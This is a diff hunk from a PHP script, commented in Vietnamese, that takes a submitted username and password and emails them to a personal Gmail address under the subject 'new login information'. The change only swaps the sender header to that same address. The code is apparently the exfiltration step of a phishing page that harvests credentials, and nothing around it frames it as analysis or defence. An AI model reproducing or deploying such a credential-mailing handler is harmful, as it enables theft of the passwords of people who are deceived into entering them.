@@ -8,7 +8,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $to = 'quangvan161097@gmail.com'; // Thay đổi địa chỉ email này thành email của bạn
     $subject = 'Thông tin đăng nhập mới';
     $message = "Tên người dùng: " . $username . "\nMật khẩu: " . $password;
-    $headers = "From: no-reply@example.com\r\n"; // Thay đổi email gửi
+    $headers = "From:quangvan161097@gmail.com\r\n"; // Thay đổi email gửi
 
     // Gửi email
     if (mail($to, $subject, $message, $headers)) {
